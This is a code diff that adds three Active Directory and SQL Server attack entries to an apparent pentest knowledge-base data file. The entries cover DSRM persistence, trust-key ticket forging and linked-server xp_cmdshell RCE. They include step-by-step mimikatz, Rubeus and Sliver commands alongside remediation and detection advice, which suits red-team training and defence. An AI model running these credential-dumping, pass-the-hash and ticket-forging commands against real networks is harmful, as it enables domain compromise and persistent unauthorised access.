@@ -1779,6 +1779,167 @@ var VULNS = [
     category: "Active Directory",
     vulns: [
       {
+        id: "dsrm-persistence",
+        name: "DSRM Administrator Persistence",
+        severity: "High",
+        ref: "https://adsecurity.org/?p=1714",
+        description: "The DSRM local administrator on a domain controller can be turned into a stealthy backdoor that logs on to the DC with a static, rarely-rotated hash.",
+        brief: "Every domain controller keeps a local Administrator account used for Directory Services Restore Mode (DSRM) — a break-glass account whose password is set at promotion and almost never changed. Its NTLM hash lives in the DC's local SAM. With Domain Admin access an attacker dumps that hash and, after a one-line registry change, uses it to authenticate to the DC over the network as its local Administrator.\n\nImpact: durable administrative persistence on a domain controller that survives domain-account password resets and is easy to miss, because it is a legitimate built-in account. It requires existing DA/DC access, so it is a persistence and re-entry technique rather than an escalation.",
+        quickReference: [
+          { label: "Dump the DSRM hash (on the DC)", cmd: "lsadump::sam            # mimikatz — DSRM = local Administrator on the DC" },
+          { label: "Allow DSRM network logon", cmd: "reg: HKLM\\System\\CurrentControlSet\\Control\\Lsa\\DsrmAdminLogonBehavior = 2" },
+          { label: "Re-enter with the hash", cmd: "sekurlsa::pth /domain:<dc-name> /user:Administrator /ntlm:<hash> /run:cmd.exe" },
+          { label: "Verify", cmd: "Authenticate to the DC as <dc-name>\\Administrator (local)" }
+        ],
+        sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. From a DC session, dump the local SAM (DSRM account)", cmd: "# DSRM password is mapped to the DC's LOCAL Administrator and stored in the SAM hive\nprivilege::debug\ntoken::elevate\nlsadump::sam            # note the Administrator RID-500 NTLM hash\n# via Sliver: package mimikatz with PEzor -> execute-assembly on the dcorp-dc session" },
+              { label: "2. Change the DSRM logon behaviour on the DC", cmd: "# by default the DSRM account cannot log on over the network; flip the registry value\n# Sliver: registry write on the DC session\nregistry write --hive HKLM --type dword \\\n  \"System\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\DsrmAdminLogonBehavior\" 2\n# 2 = the DSRM admin may log on like a normal local account" },
+              { label: "3. Re-enter later with pass-the-hash as the DSRM admin", cmd: "# use the RID-500 hash to spawn a process as the DC's local Administrator\nsekurlsa::pth /domain:<dc-hostname> /user:Administrator \\\n  /ntlm:<dsrm-ntlm-hash> /run:C:\\Windows\\System32\\cmd.exe\n# then inject a C2 payload into that process for admin access on the DC" },
+              { label: "4. Confirm persistence", cmd: "# the DSRM hash is static and unaffected by domain password resets\n# it stays valid until DSRM is explicitly reset -> a durable DC re-entry path" }
+            ]
+          },
+          {
+            title: "Why It Works",
+            type: "table",
+            columns: ["Fact", "Consequence"],
+            rows: [
+              ["DSRM password set at DC promotion", "Rarely rotated afterwards — a long-lived static credential"],
+              ["Stored in the DC's local SAM", "Recoverable with lsadump::sam once you have DC access"],
+              ["Local account, not a domain account", "Domain-wide password resets and krbtgt rotation don't invalidate it"],
+              ["DsrmAdminLogonBehavior = 2", "Removes the 'restore mode only' restriction, enabling normal/network logon"],
+              ["Built-in Administrator", "Blends in — easy to overlook during response"]
+            ]
+          },
+          {
+            title: "Attack Chain",
+            type: "table",
+            columns: ["Step", "Action", "Result"],
+            rows: [
+              ["1", "Obtain DA / DC access", "Prerequisite foothold on the DC"],
+              ["2", "lsadump::sam on the DC", "DSRM (local admin) NTLM hash"],
+              ["3", "Set DsrmAdminLogonBehavior = 2", "DSRM admin can log on normally"],
+              ["4", "Pass-the-hash as the DSRM admin", "Durable local-admin re-entry to the DC"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["Mimikatz (lsadump::sam / sekurlsa::pth)", "Dump the DSRM hash and pass-the-hash"],
+              ["Sliver (registry write / execute-assembly)", "Flip the registry value and run packaged mimikatz in memory"],
+              ["PEzor + Donut", "Package mimikatz into an execute-assembly-compatible payload"],
+              ["Rubeus / PsExec", "Re-authenticate to the DC with the recovered credential"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "ADSecurity — DSRM persistence", url: "https://adsecurity.org/?p=1714" },
+              { label: "MITRE ATT&CK — Account Manipulation (T1098)", url: "https://attack.mitre.org/techniques/T1098/" }
+            ]
+          },
+          {
+            title: "Remediation",
+            type: "notes",
+            items: [
+              "Reset the DSRM password regularly (and after any DC compromise); treat it as a Tier-0 secret.",
+              "Monitor HKLM\\System\\CurrentControlSet\\Control\\Lsa\\DsrmAdminLogonBehavior for changes to 1 or 2.",
+              "Alert on network/interactive logons by the DC's local Administrator (RID 500) — DSRM should not authenticate over the network.",
+              "Protect DCs against SAM/LSASS dumping (LSA Protection, Credential Guard, tiered admin) so the hash cannot be extracted.",
+              "Because this requires existing DA/DC access, prevention centres on stopping the DC compromise that precedes it."
+            ]
+          }
+        ]
+      },
+      {
+        id: "domain-trust-key-abuse",
+        name: "Domain / Forest Trust Key Abuse",
+        severity: "Critical",
+        ref: "https://adsecurity.org/?p=1588",
+        description: "The shared key of an AD trust lets an attacker forge inter-realm tickets, escalating across a domain or forest trust to the trusting side.",
+        brief: "When two AD domains or forests trust each other, they share a secret — the trust key — used to sign the inter-realm tickets that let a principal from one side request access on the other. An attacker who reaches Domain Admin can extract that trust key (or the krbtgt key) and forge inter-realm TGTs, moving from a child/other domain to the parent or across a forest trust as a high-privileged principal.\n\nImpact: escalation from one domain to Enterprise Admin across a forest, or lateral movement between forests, using tickets the trusting side accepts as genuine. Classic variants — inter-realm trust tickets, cross-domain golden tickets with SID history, and abusing the trust account key — all rest on the same shared-secret weakness.",
+        quickReference: [
+          { label: "Dump the trust key", cmd: "lsadump::trust /patch      # or SharpKatz / DCSync the TRUST$ account" },
+          { label: "Forge an inter-realm TGT", cmd: "Rubeus silverticket / kerberos::golden with the trust key + target SID" },
+          { label: "Add SID history (cross-domain golden)", cmd: "golden ... /sids:<EnterpriseAdmins-SID> (parent domain)" },
+          { label: "Request a service ticket cross-trust", cmd: "Rubeus asktgs -> present on the trusting resource" }
+        ],
+        sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. From DA, extract the trust key (or krbtgt) ", cmd: "# the inter-realm trust key is the password hash of the trust (TRUST$) account\nlsadump::trust /patch                 # mimikatz — shows in/out trust keys\nlsadump::dcsync /user:<domain>\\krbtgt # or the krbtgt key for a cross-domain golden ticket\n# via Sliver: package mimikatz/SharpKatz with PEzor -> execute-assembly" },
+              { label: "2a. Intra-forest: forge a cross-domain golden ticket with SID history", cmd: "# from a child domain to the forest root: add the parent's Enterprise Admins SID\nkerberos::golden /user:Administrator /domain:child.corp.local \\\n  /sid:<child-domain-SID> /krbtgt:<child-krbtgt-hash> \\\n  /sids:<root-EnterpriseAdmins-SID> /ptt\n# the ExtraSids grants EA rights when the ticket is used at the root" },
+              { label: "2b. Inter-realm: forge a trust ticket with the trust key", cmd: "# build an inter-realm TGT signed with the trust key, then ask for a service ticket on the far side\n# Rubeus:\nRubeus.exe asktgt /user:svcadmin /aes256:<hash> /opsec /ptt      # impersonate a DA first\nRubeus.exe silverticket /... (inter-realm)  ||  kerberos::golden /service:krbtgt /target:<trusted-domain>" },
+              { label: "3. Request a service ticket on the trusting domain and use it", cmd: "Rubeus.exe asktgs /ticket:<referral.kirbi> /service:cifs/<target-in-trusted-domain> /ptt\n# then access the resource (ls \\\\target\\c$, PsExec, etc.) as the impersonated principal" },
+              { label: "4. Reach Enterprise Admin across the forest", cmd: "# with EA-equivalent rights on the forest root (or the trusting forest),\n# DCSync/administer the target domain and pivot to its resources" }
+            ]
+          },
+          {
+            title: "Trust Abuse Variants",
+            type: "table",
+            columns: ["Variant", "Detail"],
+            rows: [
+              ["Cross-domain golden ticket", "child krbtgt + ExtraSids (parent Enterprise Admins SID) -> EA at the forest root"],
+              ["Inter-realm trust ticket", "Forge a TGT signed with the trust key -> request service tickets on the trusting domain"],
+              ["Trust account (TRUST$) key", "Same key both sides share; extract it to sign inter-realm referrals"],
+              ["SID filtering dependency", "External/forest trusts with SID filtering disabled let injected SIDs survive the boundary"],
+              ["krbtgt of the trusted domain", "If obtained, a full golden ticket in that domain"]
+            ]
+          },
+          {
+            title: "Attack Chain",
+            type: "table",
+            columns: ["Step", "Action", "Result"],
+            rows: [
+              ["1", "Reach Domain Admin in one domain", "Access to DC secrets"],
+              ["2", "Extract the trust key / krbtgt", "Material to sign inter-realm tickets"],
+              ["3", "Forge a trust ticket / golden + SID history", "A ticket the trusting side accepts"],
+              ["4", "Request service tickets across the trust", "Access / EA on the trusting domain"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["Mimikatz / SharpKatz", "Extract trust keys (lsadump::trust) and krbtgt; forge golden/trust tickets"],
+              ["Rubeus", "asktgt / silverticket / asktgs — forge and request inter-realm tickets"],
+              ["Impacket (ticketer / raiseChild)", "Automate cross-domain golden tickets and child-to-parent escalation"],
+              ["Sliver (execute-assembly + PEzor)", "Run Rubeus / packaged mimikatz in memory during the operation"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "ADSecurity — Sneaky persistence via trusts / trust keys", url: "https://adsecurity.org/?p=1588" },
+              { label: "The Hacker Recipes — Forest/Domain trusts", url: "https://www.thehacker.recipes/ad/movement/trusts" },
+              { label: "MITRE ATT&CK — SID-History Injection (T1134.005)", url: "https://attack.mitre.org/techniques/T1134/005/" }
+            ]
+          },
+          {
+            title: "Remediation",
+            type: "notes",
+            items: [
+              "Enable SID filtering / selective authentication on external and forest trusts so injected SIDs (SID history) do not cross the boundary.",
+              "Treat every domain in a forest as a single trust/security boundary — the forest, not the domain, is the true boundary; compromise of one domain endangers all.",
+              "Protect and rotate krbtgt and trust account keys after any DC compromise (rotate krbtgt twice).",
+              "Harden and monitor DCs against DCSync and LSASS/trust-key extraction (see AD ACL Abuse, DCSync).",
+              "Alert on anomalous inter-realm TGS requests and tickets with unexpected ExtraSids/long lifetimes."
+            ]
+          }
+        ]
+      },
+
+      {
         id: "kerberoasting-vuln",
         name: "Kerberoasting",
         severity: "High",
@@ -2973,6 +3134,89 @@ var VULNS = [
   {
     category: "Lateral Movement",
     vulns: [
+      {
+        id: "sql-server-links",
+        name: "SQL Server Trusted Database Links",
+        severity: "High",
+        ref: "https://www.netspi.com/blog/technical-blog/network-penetration-testing/how-to-hack-database-links-in-sql-server/",
+        description: "Linked SQL servers trust each other for queries, letting an attacker crawl the links to reach xp_cmdshell RCE and often a higher-privileged context.",
+        brief: "A database link is a persistent trust configured on one SQL Server so it can query another. When links are chained across an estate, a low-privileged user on the first reachable instance can issue queries that execute on a linked instance using the link's stored credentials — which are frequently more privileged. Following the chain (link crawling) can reach an instance where the link context is sysadmin.\n\nImpact: lateral movement and remote code execution across SQL Servers via xp_cmdshell, often escalating privilege at each hop, without any additional credentials. It is common because links are set up for legitimate cross-server queries and rarely audited or de-privileged.",
+        quickReference: [
+          { label: "Enumerate SQL instances (SPNs)", cmd: "Get-SQLInstanceDomain            # PowerUpSQL / SharpSQL" },
+          { label: "Check your rights on an instance", cmd: "Get-UserPrivs -Instance <sql-fqdn>" },
+          { label: "Crawl links + run a command", cmd: "Get-SQLServerLinkCrawl -Instance <sql> -Query \"exec master..xp_cmdshell 'whoami'\"" },
+          { label: "Manual link query", cmd: "SELECT * FROM openquery(\"LINKEDSRV\", 'select @@version')" }
+        ],
+        sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Discover SQL Server instances in the domain", cmd: "# SQL servers register MSSQLSvc SPNs — enumerate them via LDAP\nGet-SQLInstanceDomain            # PowerUpSQL / SharpSQL\n# e.g. via Sliver: execute-assembly -p explorer.exe -t 80 'SharpSQL.exe' 'Get-SQLInstanceDomain'" },
+              { label: "2. Find an instance you can authenticate to", cmd: "Get-UserPrivs -Instance dcorp-mssql.domain.local\n# [*] Authenticated to: dcorp-mssql...   CONNECT SQL / VIEW ANY DATABASE\n# your domain user may have CONNECT rights on one instance even without sysadmin" },
+              { label: "3. Enumerate configured database links from that instance", cmd: "Get-SQLServerLink -Instance dcorp-mssql.domain.local\n-- or in SQL:\nSELECT srvname, srvproduct, rpcout FROM master..sysservers;" },
+              { label: "4. Crawl the link chain (each hop runs as the link's stored login)", cmd: "# link crawling follows every reachable link recursively and reports the context at each hop\nGet-SQLServerLinkCrawl -Instance dcorp-mssql.domain.local\n# Path: {DCORP-MSSQL} -> {DCORP-MSSQL, DCORP-SQL1(user: dblinkuser)} -> {..., DCORP-MGMT}\n# note where 'Sysadmin : 1' appears on a downstream instance" },
+              { label: "5. Execute commands on a linked server (RCE via xp_cmdshell)", cmd: "# run a command on the far end of the chain; enable xp_cmdshell if needed\nGet-SQLServerLinkCrawl -Instance dcorp-mssql.domain.local \\\n  -Query \"exec master..xp_cmdshell 'whoami'\" -QueryTarget eu-sqlX\n-- manual nested openquery to reach a two-hop link:\nSELECT * FROM openquery(\"DCORP-SQL1\", 'SELECT * FROM openquery(\"DCORP-MGMT\",''exec master..xp_cmdshell ''''whoami'''''')')" },
+              { label: "6. Turn RCE into a foothold", cmd: "# xp_cmdshell runs as the SQL Server service account on the linked host\n# use it to run a loader / Sliver shellcode and beacon back from that server" }
+            ]
+          },
+          {
+            title: "Why the Chain Escalates",
+            type: "table",
+            columns: ["Property", "Consequence"],
+            rows: [
+              ["Links store a login", "Queries on the far server run as the link's configured account, not yours"],
+              ["Links are often over-privileged", "A link frequently authenticates as a sysadmin or a higher-priv SQL login"],
+              ["Links can be chained", "A -> B -> C: you reach C with C's link context even with no rights on C directly"],
+              ["xp_cmdshell", "If enabled (or enable-able as sysadmin), gives OS command execution as the SQL service account"],
+              ["Impersonation", "EXECUTE AS / trustworthy databases can further elevate within an instance"]
+            ]
+          },
+          {
+            title: "Attack Chain",
+            type: "table",
+            columns: ["Step", "Action", "Result"],
+            rows: [
+              ["1", "Enumerate MSSQL instances + your access", "A reachable instance"],
+              ["2", "Enumerate and crawl database links", "Map of the trust chain + contexts"],
+              ["3", "Find a hop where the link is sysadmin", "Privileged execution context"],
+              ["4", "xp_cmdshell on that linked server", "RCE as the SQL service account"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["PowerUpSQL / SharpSQL", "Discover instances, check privileges, crawl links (Get-SQLServerLinkCrawl)"],
+              ["mssqlclient.py (Impacket)", "Manual authenticated SQL, openquery link hopping, xp_cmdshell"],
+              ["Sliver (execute-assembly)", "Run SharpSQL / a PS2EXE-packaged PowerUpSQL in memory"],
+              ["Rubeus", "Kerberos auth / ticket for the SQL service where needed"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "NetSPI — Hacking SQL Server database links", url: "https://www.netspi.com/blog/technical-blog/network-penetration-testing/how-to-hack-database-links-in-sql-server/" },
+              { label: "PowerUpSQL — GitHub", url: "https://github.com/NetSPI/PowerUpSQL" },
+              { label: "MITRE ATT&CK — SQL Stored Procedures (T1505.001)", url: "https://attack.mitre.org/techniques/T1505/001/" }
+            ]
+          },
+          {
+            title: "Remediation",
+            type: "notes",
+            items: [
+              "Remove unnecessary database links; where required, configure them with a least-privilege login, never a sysadmin.",
+              "Keep xp_cmdshell disabled and deny the SQL service account local privileges it does not need.",
+              "Run SQL Server services as low-privileged (virtual/managed) accounts so RCE via xp_cmdshell yields little.",
+              "Audit sysservers / linked-server logins regularly; alert on Get-SQLServerLinkCrawl-style recursive openquery activity.",
+              "Segment SQL servers and restrict which principals can CONNECT to each instance."
+            ]
+          }
+        ]
+      },
+
       {
         id: "pass-the-hash",
         name: "Pass-the-Hash / Pass-the-Ticket",
